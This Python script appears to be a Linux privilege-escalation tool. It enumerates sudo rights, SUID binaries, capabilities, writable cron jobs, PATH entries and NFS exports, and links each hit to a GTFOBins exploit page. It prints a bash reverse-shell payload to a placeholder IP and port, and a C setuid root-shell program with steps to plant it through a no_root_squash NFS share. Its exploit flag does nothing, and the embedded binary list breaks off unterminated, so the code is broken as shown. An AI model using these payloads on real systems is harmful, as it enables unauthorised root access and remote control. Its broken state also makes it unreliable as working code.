import argparse
import os
import pexpect
import re
import subprocess
from colorama import Fore, Back, Style
from pexpect import pxssh
try:									# python3
	from urllib.parse import urljoin
except ImportError:						# python2
	from urlparse import urljoin

# COLORS
black = Fore.BLACK
blue = Fore.BLUE  						# vuln text/URL
cyan = Fore.CYAN   						# header text e.g. Exploit:
green = Fore.GREEN 						# normal text
magenta = Fore.MAGENTA
red = Fore.RED
reset = Fore.RESET
yellow = Fore.YELLOW
white = Fore.WHITE

# BACKGROUNDS
bblack = Back.BLACK
bblue = Back.BLUE
bcyan = Back.CYAN
bgreen = Back.GREEN
bmagenta = Back.MAGENTA
bred = Back.RED
breset = Back.RESET
byellow = Back.YELLOW
bwhite = Back.WHITE

# STYLES
dim = Style.DIM
bright = Style.BRIGHT
normal = Style.NORMAL
reset_all = Style.RESET_ALL

def command(cmd):
	cmd = cmd.split(' ')	# array				# subprocess.DEVNULL is used instead of 2>/dev/null
	try:										# python3
		return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode().strip()
	except AttributeError:						# python2
		return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]

def get_kernel_version():
	kernel_version = ''
	kernel_version = re.findall('(\d+\.\d+\.\d+[^\s]+)',
											command('uname -a'))[0]
	if not kernel_version:
		kernel_version = re.findall('(\d+\.\d+\.\d+[^\s]+)',
											command('cat /proc/version'))[0]
	return kernel_version

def get_os_version():
	os_version = ''
	os_version = re.findall('(?:Description:\s*)(.*)',
											command('lsb_release -a'))[0]
	if not os_version:
		os_version = re.findall(r'(.*)(?:\\n)', command('cat /etc/issue'))[0]
	return os_version

def get_path_var():
	return re.findall('(.*?):', re.findall('(?:\nPATH=)(.*)', command('env'))[0])

def get_sudo_l(password=''):
	child = pexpect.spawn('sudo -l')
	i = child.expect([r'password for .+:', pexpect.EOF])
	if i == 0:	# send password if needed
		child.sendline(password)
		j = child.expect([r'password for .+:', pexpect.EOF])
		# if password is incorrect
		if j == 0:
			return ''
	sudo_rights = re.findall('(?:NOPASSWD:\s*)(.*?)(?:\\r)', child.before.decode())
	child.close()
	return sudo_rights

def get_suid():
	return re.findall('(/.*)', command('find / -type f -perm -04000 -ls'))

def get_cap_r():
	return re.findall('(.*?)(?:\s*=\s*.*cap_setuid\+ep.*)', command('getcap -r /'))

def exploit_gtfobins(sudo_rights, suid_rights, cap_rights):
	print(green + '######## ' + red + ' GTFOBins ' + green + ' ########' + reset)
	with open(__file__, 'r') as f:
		gtfobins = False
		for line in f:
			if '""" Start of GTFOBins' == line.strip():
				gtfobins = True
			elif 'End of GTFOBins """' == line.strip():
				gtfobins = False
				break
			elif gtfobins:
				binary_name, binary_url, binary_func = line.split(' --> ')

				# sudo -l
				for sudo_right in sudo_rights:
					# binary exists in our gtfobin list & is vuln
					if (sudo_right.split('/')[-1] == binary_name) and ('Sudo' in binary_func):
						print(blue+sudo_right+green+' is vulnerable to "sudo -l" vulnerability')
						exploit_url = urljoin('https://gtfobins.github.io/', binary_url) + '#sudo'
						print(cyan + 'Exploit: ' + blue + exploit_url + reset_all)
				
				# suid
				for suid_right in suid_rights:
					# binary exists in our gtfobin list & is vuln
					if (suid_right.split('/')[-1] == binary_name) and ('SUID' in binary_func):
						print(blue+suid_right+green+' is vulnerable to "SUID" vulnerability')
						exploit_url = urljoin('https://gtfobins.github.io/', binary_url) + '#suid'
						print(cyan + 'Exploit: ' + blue + exploit_url + reset_all)

				# capabilities
				for cap_right in cap_rights:
					# binary exists in our gtfobin list & is vuln
					if (cap_right.split('/')[-1] == binary_name) and ('Capabilities' in binary_func):
						print(blue+cap_right+green+' is vulnerable to "Capabilities" vulnerability')
						exploit_url = urljoin('https://gtfobins.github.io/', binary_url) + '#capabilities'
						print(cyan + 'Exploit: ' + blue + exploit_url + reset_all)

def exploit_cron_jobs():
	print(green + '######## ' + red + ' Cron Jobs ' + green + ' ########' + reset)
	# jobs run by root user
	root_jobs = re.findall('(?:\s*[*, 0-9, /]+\s+[*, 0-9, /]+\s+[*, 0-9, /]+\s+[*, 0-9, /]+\s+[*, 0-9, /]+\s+root\s+)(.*)', command('cat /etc/crontab'))
	for root_job in root_jobs:
		if not '&& run-parts --report' in root_job:
			# check for write/modify privilege
			piece = root_job.strip().split(' ')
			if len(piece) != 1:
				print('Can Not determine the binary in /etc/crontab')
				return ''
			write_permission = os.access(root_job, os.W_OK)
			if write_permission:
				print(blue+root_job+green+' cron job is vulnerable')
				print(cyan+'Payload: '+blue+'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1' + reset_all)

def exploit_path(path_variable, suid_rights):
	print(green + '######## ' + red + ' PATH ' + green + ' ########' + reset)
	vuln = False
	try:
		# works but does NOT change $PATH pemanently
		# Thus, changes gets discarded at the end of python script
		os.system('export PATH=$PATH:/tmp')
		print(green+'Paths can be exported to '+cyan+'$PATH'+green+' . Hence, may be vulnerable'+reset)
		vuln = True
	except:
		pass
	for path in path_variable:
		if os.access(path, os.W_OK):
			print(blue+path+green+' in $PATH has write access . Hence, may be vulnerable'+reset)
			vuln = True
	if vuln:
		print(green+'Binaries with '+cyan+'SUID bit'+green+' set and having '+cyan+'execute permission:'+reset)
		for suid_right in suid_rights:
			if os.access(suid_right, os.X_OK):
				print(blue + suid_right)
		print(green+'Manually go through this binaries and see if anyone of them did '+blue+'NOT use absolute path')
		print(green+'Use the following payload and remember to '+cyan+'save the name accordingly')
		print(cyan+'Payload: '+blue+'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1')
		print(green+'Command for '+cyan+'writable'+green+' directories: '+blue+'find / -writable -type d 2>/dev/null'+reset_all)

def exploit_nfs():
	# Root Squashing(root_squash) parameter prevents having root access 
	# to remote root users connected to NFS volume. 
	# Remote root users are assigned a user "nfsnobody" when connected, which has the least local privileges. 
	# Alternatively "no_root_squash" option turns off the "squashing of root user" 
	# and gives the remote user root access to the connected system. 
	print(green + '######## ' + red + ' Network File Sharing (NFS) ' + green + ' ########' + reset)
	nfs_vuln = False
	for line in command('cat /etc/exports').split('\n'):
		if len(line) == 0:
			return
		if line.strip()[0] == '#':		# ignore comments
			continue
		options = [x.strip() for x in line.split('(')[1].split(')')[0].split(',')]
		if 'rw' in options and 'no_root_squash' in options:	# read-write options enabled
			nfs_vuln = True
			mountable_share = line.strip().split(' ')[0]
			print(blue + mountable_share + green + ' share is vulnerable to NFS weak permissions')
	if nfs_vuln:
		print(cyan + 'In the ATTACKER machine: ')
		print(cyan + 'Command: ' + blue + 'mount -o rw [IP]:[VULNERABLE_SHARE] [DIRECTORY_TO_MOUNT]')
		print(green+'Create the following executable wth the SUID bit set:')
		print(blue + """int main()
			{
				setgid(0);
				setuid(0);
				system("/bin/bash");
				return 0;
			}""")
		print(cyan + 'Compile: ' + blue + 'gcc [EXECUTABLE_NAME].c -o [EXECUTABLE_NAME]')
		print(cyan + 'Set SUID bit: ' + blue + 'chmod +s [EXECUTABLE_NAME]')
		print(cyan + 'In the VICTIM machine: ')
		print(cyan + 'Execute: ' + blue + './[EXECUTABLE_NAME]')


def scan(password=''):
	### System Info ###
	# host = command('hostname')								# host
	# kernel_version = get_kernel_version()					# kernel version
	# os_version = get_os_version()							# os version
	path_variable = get_path_var()							# PATH variable

	### Sudo -l ###
	sudo_rights = get_sudo_l(password)						# binaries with sudo rights enabled

	### SUID ###
	suid_rights = get_suid()

	### Capabilities ###
	cap_rights = get_cap_r()

	### Exploit GTFOBins ###
	exploit_gtfobins(sudo_rights, suid_rights, cap_rights)	# exploit gtfobins vuln

	### Cron Jobs ###
	exploit_cron_jobs()

	### PATH ###
	exploit_path(path_variable, suid_rights)

	### Network File Sharing (NFS) ###
	# The Network File System (NFS) is a client/server application 
	# that lets a computer user view and optionally store and update files 
	# on a remote computer as though they were on the user's own computer
	exploit_nfs()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-e', '--exploit', help='Exploit to get root shell (May Prove Fatal In Some Cases)', 
							action='store_true')
	parser.add_argument('-p', '--password', help='Password of current user')
	args = parser.parse_args()
	
	exploit = args.exploit
	password = args.password

	if not password:
		password = ''

	scan(password)
	if exploit:
		print('exploit')

if __name__ == '__main__':
	main()

""" Start of GTFOBins
ab --> /gtfobins/ab/ --> ['File upload', 'File download', 'SUID', 'Sudo']
agetty --> /gtfobins/agetty/ --> ['SUID']
ansible-playbook --> /gtfobins/ansible-playbook/ --> ['Shell', 'Sudo']
apt-get --> /gtfobins/apt-get/ --> ['Shell', 'Sudo']
apt --> /gtfobins/apt/ --> ['Shell', 'Sudo']
ar --> /gtfobins/ar/ --> ['File read', 'SUID', 'Sudo']
aria2c --> /gtfobins/aria2c/ --> ['Command', 'Sudo', 'Limited SUID']
arj --> /gtfobins/arj/ --> ['File write', 'File read', 'SUID', 'Sudo']
arp --> /gtfobins/arp/ --> ['File read', 'SUID', 'Sudo']
as --> /gtfobins/as/ --> ['File read', 'SUID', 'Sudo']
ascii-xfr --> /gtfobins/ascii-xfr/ --> ['File read', 'SUID', 'Sudo']
ascii85 --> /gtfobins/ascii85/ --> ['File read', 'Sudo']
ash --> /gtfobins/ash/ --> ['Shell', 'File write', 'SUID', 'Sudo']
aspell --> /gtfobins/aspell/ --> ['File read', 'SUID', 'Sudo']
at --> /gtfobins/at/ --> ['Shell', 'Command', 'Sudo']
atobm --> /gtfobins/atobm/ --> ['File read', 'SUID', 'Sudo']
awk --> /gtfobins/awk/ --> ['Shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
base32 --> /gtfobins/base32/ --> ['File read', 'SUID', 'Sudo']
base64 --> /gtfobins/base64/ --> ['File read', 'SUID', 'Sudo']
basenc --> /gtfobins/basenc/ --> ['File read', 'SUID', 'Sudo']
bash --> /gtfobins/bash/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo']
bpftrace --> /gtfobins/bpftrace/ --> ['Sudo']
bridge --> /gtfobins/bridge/ --> ['File read', 'SUID', 'Sudo']
bundler --> /gtfobins/bundler/ --> ['Shell', 'Sudo']
busctl --> /gtfobins/busctl/ --> ['Shell', 'Sudo']
busybox --> /gtfobins/busybox/ --> ['Shell', 'File upload', 'File write', 'File read', 'SUID', 'Sudo']
byebug --> /gtfobins/byebug/ --> ['Shell', 'Sudo', 'Limited SUID']
bzip2 --> /gtfobins/bzip2/ --> ['File read', 'SUID', 'Sudo']
c89 --> /gtfobins/c89/ --> ['Shell', 'File write', 'File read', 'Sudo']
c99 --> /gtfobins/c99/ --> ['Shell', 'File write', 'File read', 'Sudo']
cancel --> /gtfobins/cancel/ --> ['File upload']
capsh --> /gtfobins/capsh/ --> ['Shell', 'SUID', 'Sudo']
cat --> /gtfobins/cat/ --> ['File read', 'SUID', 'Sudo']
certbot --> /gtfobins/certbot/ --> ['Shell', 'Sudo']
check_by_ssh --> /gtfobins/check_by_ssh/ --> ['Shell', 'Sudo']
check_cups --> /gtfobins/check_cups/ --> ['File read', 'Sudo']
check_log --> /gtfobins/check_log/ --> ['File write', 'File read', 'Sudo']
check_memory --> /gtfobins/check_memory/ --> ['File read', 'Sudo']
check_raid --> /gtfobins/check_raid/ --> ['File read', 'Sudo']
check_ssl_cert --> /gtfobins/check_ssl_cert/ --> ['Command', 'Sudo']
check_statusfile --> /gtfobins/check_statusfile/ --> ['File read', 'Sudo']
chmod --> /gtfobins/chmod/ --> ['SUID', 'Sudo']
choom --> /gtfobins/choom/ --> ['Shell', 'SUID', 'Sudo']
chown --> /gtfobins/chown/ --> ['SUID', 'Sudo']
chroot --> /gtfobins/chroot/ --> ['SUID', 'Sudo']
cmp --> /gtfobins/cmp/ --> ['File read', 'SUID', 'Sudo']
cobc --> /gtfobins/cobc/ --> ['Shell', 'Sudo']
column --> /gtfobins/column/ --> ['File read', 'SUID', 'Sudo']
comm --> /gtfobins/comm/ --> ['File read', 'SUID', 'Sudo']
composer --> /gtfobins/composer/ --> ['Shell', 'Sudo', 'Limited SUID']
cowsay --> /gtfobins/cowsay/ --> ['Shell', 'Sudo']
cowthink --> /gtfobins/cowthink/ --> ['Shell', 'Sudo']
cp --> /gtfobins/cp/ --> ['File write', 'File read', 'SUID', 'Sudo']
cpan --> /gtfobins/cpan/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'Sudo']
cpio --> /gtfobins/cpio/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
cpulimit --> /gtfobins/cpulimit/ --> ['Shell', 'SUID', 'Sudo']
crash --> /gtfobins/crash/ --> ['Shell', 'Command', 'Sudo']
crontab --> /gtfobins/crontab/ --> ['Command', 'Sudo']
csh --> /gtfobins/csh/ --> ['Shell', 'File write', 'SUID', 'Sudo']
csplit --> /gtfobins/csplit/ --> ['File write', 'File read', 'SUID', 'Sudo']
csvtool --> /gtfobins/csvtool/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
cupsfilter --> /gtfobins/cupsfilter/ --> ['File read', 'SUID', 'Sudo']
curl --> /gtfobins/curl/ --> ['File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo']
cut --> /gtfobins/cut/ --> ['File read', 'SUID', 'Sudo']
dash --> /gtfobins/dash/ --> ['Shell', 'File write', 'SUID', 'Sudo']
date --> /gtfobins/date/ --> ['File read', 'SUID', 'Sudo']
dd --> /gtfobins/dd/ --> ['File write', 'File read', 'SUID', 'Sudo']
dialog --> /gtfobins/dialog/ --> ['File read', 'SUID', 'Sudo']
diff --> /gtfobins/diff/ --> ['File read', 'SUID', 'Sudo']
dig --> /gtfobins/dig/ --> ['File read', 'SUID', 'Sudo']
dmesg --> /gtfobins/dmesg/ --> ['Shell', 'File read', 'Sudo']
dmidecode --> /gtfobins/dmidecode/ --> ['Sudo']
dmsetup --> /gtfobins/dmsetup/ --> ['SUID', 'Sudo']
dnf --> /gtfobins/dnf/ --> ['Sudo']
docker --> /gtfobins/docker/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
dosbox --> /gtfobins/dosbox/ --> ['File write', 'File read', 'SUID', 'Sudo']
dpkg --> /gtfobins/dpkg/ --> ['Shell', 'Sudo']
dvips --> /gtfobins/dvips/ --> ['Shell', 'Sudo', 'Limited SUID']
easy_install --> /gtfobins/easy_install/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'Sudo']
eb --> /gtfobins/eb/ --> ['Shell', 'Sudo']
ed --> /gtfobins/ed/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
efax --> /gtfobins/efax/ --> ['SUID', 'Sudo']
emacs --> /gtfobins/emacs/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
env --> /gtfobins/env/ --> ['Shell', 'SUID', 'Sudo']
eqn --> /gtfobins/eqn/ --> ['File read', 'SUID', 'Sudo']
ex --> /gtfobins/ex/ --> ['Shell', 'File write', 'File read', 'Sudo']
exiftool --> /gtfobins/exiftool/ --> ['File write', 'File read', 'Sudo']
expand --> /gtfobins/expand/ --> ['File read', 'SUID', 'Sudo']
expect --> /gtfobins/expect/ --> ['Shell', 'File read', 'SUID', 'Sudo']
facter --> /gtfobins/facter/ --> ['Shell', 'Sudo']
file --> /gtfobins/file/ --> ['File read', 'SUID', 'Sudo']
find --> /gtfobins/find/ --> ['Shell', 'SUID', 'Sudo']
finger --> /gtfobins/finger/ --> ['File upload', 'File download']
fish --> /gtfobins/fish/ --> ['Shell', 'SUID', 'Sudo']
flock --> /gtfobins/flock/ --> ['Shell', 'SUID', 'Sudo']
fmt --> /gtfobins/fmt/ --> ['File read', 'SUID', 'Sudo']
fold --> /gtfobins/fold/ --> ['File read', 'SUID', 'Sudo']
fping --> /gtfobins/fping/ --> ['File read', 'Sudo']
ftp --> /gtfobins/ftp/ --> ['Shell', 'File upload', 'File download', 'Sudo']
gawk --> /gtfobins/gawk/ --> ['Shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
gcc --> /gtfobins/gcc/ --> ['Shell', 'File write', 'File read', 'Sudo']
gcore --> /gtfobins/gcore/ --> ['File read', 'SUID', 'Sudo']
gdb --> /gtfobins/gdb/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities']
gem --> /gtfobins/gem/ --> ['Shell', 'Sudo']
genie --> /gtfobins/genie/ --> ['Shell', 'SUID', 'Sudo']
genisoimage --> /gtfobins/genisoimage/ --> ['File read', 'SUID', 'Sudo']
ghc --> /gtfobins/ghc/ --> ['Shell', 'Sudo']
ghci --> /gtfobins/ghci/ --> ['Shell', 'Sudo']
gimp --> /gtfobins/gimp/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo']
ginsh --> /gtfobins/ginsh/ --> ['Shell', 'Sudo', 'Limited SUID']
git --> /gtfobins/git/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
grc --> /gtfobins/grc/ --> ['Shell', 'Sudo']
grep --> /gtfobins/grep/ --> ['File read', 'SUID', 'Sudo']
gtester --> /gtfobins/gtester/ --> ['Shell', 'File write', 'SUID', 'Sudo']
gzip --> /gtfobins/gzip/ --> ['File read', 'SUID', 'Sudo']
hd --> /gtfobins/hd/ --> ['File read', 'SUID', 'Sudo']
head --> /gtfobins/head/ --> ['File read', 'SUID', 'Sudo']
hexdump --> /gtfobins/hexdump/ --> ['File read', 'SUID', 'Sudo']
highlight --> /gtfobins/highlight/ --> ['File read', 'SUID', 'Sudo']
hping3 --> /gtfobins/hping3/ --> ['Shell', 'SUID', 'Sudo']
iconv --> /gtfobins/iconv/ --> ['File write', 'File read', 'SUID', 'Sudo']
iftop --> /gtfobins/iftop/ --> ['Shell', 'Sudo', 'Limited SUID']
install --> /gtfobins/install/ --> ['SUID', 'Sudo']
ionice --> /gtfobins/ionice/ --> ['Shell', 'SUID', 'Sudo']
ip --> /gtfobins/ip/ --> ['File read', 'SUID', 'Sudo']
irb --> /gtfobins/irb/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'Sudo']
ispell --> /gtfobins/ispell/ --> ['Shell', 'SUID', 'Sudo']
jjs --> /gtfobins/jjs/ --> ['Shell', 'Reverse shell', 'File download', 'File write', 'File read', 'SUID', 'Sudo']
join --> /gtfobins/join/ --> ['File read', 'SUID', 'Sudo']
journalctl --> /gtfobins/journalctl/ --> ['Shell', 'Sudo']
jq --> /gtfobins/jq/ --> ['File read', 'SUID', 'Sudo']
jrunscript --> /gtfobins/jrunscript/ --> ['Shell', 'Reverse shell', 'File download', 'File write', 'File read', 'SUID', 'Sudo']
knife --> /gtfobins/knife/ --> ['Shell', 'Sudo']
ksh --> /gtfobins/ksh/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo']
ksshell --> /gtfobins/ksshell/ --> ['File read', 'SUID', 'Sudo']
latex --> /gtfobins/latex/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
ld.so --> /gtfobins/ld.so/ --> ['Shell', 'SUID', 'Sudo']
ldconfig --> /gtfobins/ldconfig/ --> ['Sudo', 'Limited SUID']
less --> /gtfobins/less/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo']
lftp --> /gtfobins/lftp/ --> ['Shell', 'Sudo', 'Limited SUID']
ln --> /gtfobins/ln/ --> ['Sudo']
loginctl --> /gtfobins/loginctl/ --> ['Shell', 'Sudo']
logsave --> /gtfobins/logsave/ --> ['Shell', 'SUID', 'Sudo']
look --> /gtfobins/look/ --> ['File read', 'SUID', 'Sudo']
lp --> /gtfobins/lp/ --> ['File upload']
ltrace --> /gtfobins/ltrace/ --> ['Shell', 'File write', 'File read', 'Sudo']
lua --> /gtfobins/lua/ --> ['Shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
lualatex --> /gtfobins/lualatex/ --> ['Shell', 'Sudo', 'Limited SUID']
luatex --> /gtfobins/luatex/ --> ['Shell', 'Sudo', 'Limited SUID']
lwp-download --> /gtfobins/lwp-download/ --> ['File download', 'File write', 'File read', 'Sudo']
lwp-request --> /gtfobins/lwp-request/ --> ['File read', 'Sudo']
mail --> /gtfobins/mail/ --> ['Shell', 'Sudo']
make --> /gtfobins/make/ --> ['Shell', 'File write', 'SUID', 'Sudo']
man --> /gtfobins/man/ --> ['Shell', 'File read', 'Sudo']
mawk --> /gtfobins/mawk/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
more --> /gtfobins/more/ --> ['Shell', 'File read', 'SUID', 'Sudo']
mosquitto --> /gtfobins/mosquitto/ --> ['File read', 'SUID', 'Sudo']
mount --> /gtfobins/mount/ --> ['Sudo']
msgattrib --> /gtfobins/msgattrib/ --> ['File read', 'SUID', 'Sudo']
msgcat --> /gtfobins/msgcat/ --> ['File read', 'SUID', 'Sudo']
msgconv --> /gtfobins/msgconv/ --> ['File read', 'SUID', 'Sudo']
msgfilter --> /gtfobins/msgfilter/ --> ['Shell', 'File read', 'SUID', 'Sudo']
msgmerge --> /gtfobins/msgmerge/ --> ['File read', 'SUID', 'Sudo']
msguniq --> /gtfobins/msguniq/ --> ['File read', 'SUID', 'Sudo']
mtr --> /gtfobins/mtr/ --> ['File read', 'Sudo']
mv --> /gtfobins/mv/ --> ['SUID', 'Sudo']
mysql --> /gtfobins/mysql/ --> ['Shell', 'Library load', 'Sudo', 'Limited SUID']
nano --> /gtfobins/nano/ --> ['Shell', 'File write', 'File read', 'Sudo', 'Limited SUID']
nasm --> /gtfobins/nasm/ --> ['File read', 'SUID', 'Sudo']
nawk --> /gtfobins/nawk/ --> ['Shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
nc --> /gtfobins/nc/ --> ['Reverse shell', 'Bind shell', 'File upload', 'File download', 'Sudo', 'Limited SUID']
neofetch --> /gtfobins/neofetch/ --> ['Shell', 'File read', 'Sudo']
nice --> /gtfobins/nice/ --> ['Shell', 'SUID', 'Sudo']
nl --> /gtfobins/nl/ --> ['File read', 'SUID', 'Sudo']
nm --> /gtfobins/nm/ --> ['File read', 'SUID', 'Sudo']
nmap --> /gtfobins/nmap/ --> ['Shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
node --> /gtfobins/node/ --> ['Shell', 'Reverse shell', 'Bind shell', 'File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo', 'Capabilities']
nohup --> /gtfobins/nohup/ --> ['Shell', 'Command', 'SUID', 'Sudo']
npm --> /gtfobins/npm/ --> ['Shell', 'Sudo']
nroff --> /gtfobins/nroff/ --> ['Shell', 'File read', 'Sudo']
nsenter --> /gtfobins/nsenter/ --> ['Shell', 'Sudo']
octave --> /gtfobins/octave/ --> ['Shell', 'File write', 'File read', 'Sudo', 'Limited SUID']
od --> /gtfobins/od/ --> ['File read', 'SUID', 'Sudo']
openssl --> /gtfobins/openssl/ --> ['Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo']
openvpn --> /gtfobins/openvpn/ --> ['Shell', 'File read', 'SUID', 'Sudo']
openvt --> /gtfobins/openvt/ --> ['Sudo']
opkg --> /gtfobins/opkg/ --> ['Sudo']
paste --> /gtfobins/paste/ --> ['File read', 'SUID', 'Sudo']
pax --> /gtfobins/pax/ --> ['File read']
pdb --> /gtfobins/pdb/ --> ['Shell', 'Sudo']
pdflatex --> /gtfobins/pdflatex/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
pdftex --> /gtfobins/pdftex/ --> ['Shell', 'Sudo', 'Limited SUID']
perf --> /gtfobins/perf/ --> ['Shell', 'SUID', 'Sudo']
perl --> /gtfobins/perl/ --> ['Shell', 'Reverse shell', 'File read', 'SUID', 'Sudo', 'Capabilities']
pg --> /gtfobins/pg/ --> ['Shell', 'File read', 'SUID', 'Sudo']
php --> /gtfobins/php/ --> ['Shell', 'Command', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'SUID', 'Sudo', 'Capabilities']
pic --> /gtfobins/pic/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
pico --> /gtfobins/pico/ --> ['Shell', 'File write', 'File read', 'Sudo', 'Limited SUID']
pidstat --> /gtfobins/pidstat/ --> ['Command', 'SUID', 'Sudo']
pip --> /gtfobins/pip/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'Sudo']
pkexec --> /gtfobins/pkexec/ --> ['Sudo']
pkg --> /gtfobins/pkg/ --> ['Sudo']
pr --> /gtfobins/pr/ --> ['File read', 'SUID', 'Sudo']
pry --> /gtfobins/pry/ --> ['Shell', 'Sudo', 'Limited SUID']
psftp --> /gtfobins/psftp/ --> ['Shell', 'Sudo', 'Limited SUID']
psql --> /gtfobins/psql/ --> ['Shell', 'Sudo']
ptx --> /gtfobins/ptx/ --> ['File read', 'SUID', 'Sudo']
puppet --> /gtfobins/puppet/ --> ['Shell', 'File write', 'File read', 'Sudo']
python --> /gtfobins/python/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities']
rake --> /gtfobins/rake/ --> ['Shell', 'File read', 'Sudo', 'Limited SUID']
readelf --> /gtfobins/readelf/ --> ['File read', 'SUID', 'Sudo']
red --> /gtfobins/red/ --> ['File write', 'File read', 'Sudo']
redcarpet --> /gtfobins/redcarpet/ --> ['File read', 'Sudo']
restic --> /gtfobins/restic/ --> ['File upload', 'SUID', 'Sudo']
rev --> /gtfobins/rev/ --> ['File read', 'SUID', 'Sudo']
rlogin --> /gtfobins/rlogin/ --> ['File upload']
rlwrap --> /gtfobins/rlwrap/ --> ['Shell', 'File write', 'SUID', 'Sudo']
rpm --> /gtfobins/rpm/ --> ['Shell', 'Sudo', 'Limited SUID']
rpmdb --> /gtfobins/rpmdb/ --> ['Shell', 'Sudo', 'Limited SUID']
rpmquery --> /gtfobins/rpmquery/ --> ['Shell', 'Sudo', 'Limited SUID']
rpmverify --> /gtfobins/rpmverify/ --> ['Shell', 'Sudo', 'Limited SUID']
rsync --> /gtfobins/rsync/ --> ['Shell', 'SUID', 'Sudo']
ruby --> /gtfobins/ruby/ --> ['Shell', 'Reverse shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'Sudo', 'Capabilities']
run-mailcap --> /gtfobins/run-mailcap/ --> ['Shell', 'File write', 'File read', 'Sudo']
run-parts --> /gtfobins/run-parts/ --> ['Shell', 'SUID', 'Sudo']
rview --> /gtfobins/rview/ --> ['Shell', 'Reverse shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities', 'Limited SUID']
rvim --> /gtfobins/rvim/ --> ['Shell', 'Reverse shell', 'Non-interactive reverse shell', 'Non-interactive bind shell', 'File upload', 'File download', 'File write', 'File read', 'Library load', 'SUID', 'Sudo', 'Capabilities', 'Limited SUID']
sash --> /gtfobins/sash/ --> ['Shell', 'SUID', 'Sudo']
scp --> /gtfobins/scp/ --> ['Shell', 'File upload', 'File download', 'Sudo', 'Limited SUID']
screen --> /gtfobins/screen/ --> ['Shell', 'File write', 'Sudo']
script --> /gtfobins/script/ --> ['Shell', 'File write', 'Sudo']
sed --> /gtfobins/sed/ --> ['Shell', 'Command', 'File write', 'File read', 'SUID', 'Sudo']
service --> /gtfobins/service/ --> ['Shell', 'Sudo']
setarch --> /gtfobins/setarch/ --> ['Shell', 'SUID', 'Sudo']
sftp --> /gtfobins/sftp/ --> ['Shell', 'File upload', 'File download', 'Sudo']
sg --> /gtfobins/sg/ --> ['Shell', 'Sudo']
shuf --> /gtfobins/shuf/ --> ['File write', 'File read', 'SUID', 'Sudo']
slsh --> /gtfobins/slsh/ --> ['Shell', 'Sudo', 'Limited SUID']
smbclient --> /gtfobins/smbclient/ --> ['Shell', 'File upload', 'File download', 'Sudo']
snap --> /gtfobins/snap/ --> ['Sudo']
socat --> /gtfobins/socat/ --> ['Shell', 'Reverse shell', 'Bind shell', 'File upload', 'File download', 'File write', 'File read', 'Sudo', 'Limited SUID']
soelim --> /gtfobins/soelim/ --> ['File read', 'SUID', 'Sudo']
sort --> /gtfobins/sort/ --> ['File read', 'SUID', 'Sudo']
split --> /gtfobins/split/ --> ['Shell', 'Command', 'File write', 'File read', 'Sudo']
sqlite3 --> /gtfobins/sqlite3/ --> ['Shell', 'File write', 'File read', 'SUID', 'Sudo', 'Limited SUID']
ss --> /gtfobins/ss/ --> ['File read', 'SUID', 'Sudo']
ssh-keygen --> /gtfobins/ssh-keygen/ --> ['Library load', 'SUID', 'Sudo']
ssh-keyscan --> /gtfobins/ssh-keyscan/ --> ['File read', 'SUID', 'Sudo']
ssh --> /gtfobins/ssh/ --> ['Shell', 'File upload', 'File download', 'File read', 'Sudo']
sshpass --> /gtfobins/sshpass/ --> ['Shell', 'SUID', 'Sudo']
start-stop-daemon --> /gtfobins/start-stop-daemon/ --> ['Shell', 'SUID', 'Sudo']
stdbuf --> /gtfobins/stdbuf/ --> ['Shell', 'SUID', 'Sudo']
strace --> /gtfobins/strace/ --> ['Shell', 'File write', 'SUID', 'Sudo']
strings --> /gtfobins/strings/ --> ['File read', 'SUID', 'Sudo']
su --> /gtfobins/su/ --> ['Sudo']
